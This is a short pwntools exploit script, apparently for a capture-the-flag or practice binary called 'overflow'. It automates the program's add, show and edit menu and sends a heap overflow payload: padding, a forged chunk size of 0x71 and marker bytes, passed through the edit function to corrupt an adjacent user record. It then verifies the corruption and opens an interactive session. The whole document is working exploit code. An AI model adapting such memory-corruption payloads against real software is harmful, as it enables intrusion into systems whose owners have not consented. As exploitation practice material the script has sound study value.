from pwn import *

# Configure pwntools
context.log_level = 'DEBUG'
context.binary = elf = ELF('./overflow')

# Connect to the process
p = process('./overflow')

def AddUser(name, password, intro, motto):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"name > ", name)
    p.sendlineafter(b"password > ", password)
    p.sendlineafter(b"introduction > ", intro)
    p.sendlineafter(b"motto > ", motto)
    p.recvuntil(b"at index ")
    return int(p.recvline().strip())

def ShowUser(index, password):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)
    p.recvuntil(b"user name: ")
    name = p.recv(0x20)
    p.recvuntil(b"user motto: ")
    motto = p.recv(0x20)
    p.recvuntil(b"user intro: ")
    intro = p.recv(0x40)
    return name, motto, intro

def EditUser(index, password, name, intro, motto):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index > ", str(index).encode())
    p.sendlineafter(b"password > ", password)
    p.sendlineafter(b"new name > ", name)
    p.sendlineafter(b"new introduction > ", intro)
    p.sendlineafter(b"new motto > ", motto)

# Create two adjacent users
idx1 = AddUser(b"Anyaa", b"Reese", b"intro1", b"motto1")
idx2 = AddUser(b"Meave", b"Weily", b"intro2", b"motto2")

# Check initial state
name, motto, intro = ShowUser(idx2, b"Weily")
print(f"Name: {name}\nMotto: {motto}\nIntro: {intro}")

# Construct overflow payload
payload = b"A" * 0x40
payload += p64(0x71)
payload += b"\x00" * 7
payload += b"OVERFLOW"

# Trigger the overflow through edit
EditUser(idx1, b"Reese", b"Anyaa", payload, b"motto1")

# Verify the overflow
print("\nState after overflow:")
name, motto, intro = ShowUser(idx2, b"Weily")
print(f"Name: {name}\nMotto: {motto}\nIntro: {intro}")

p.interactive()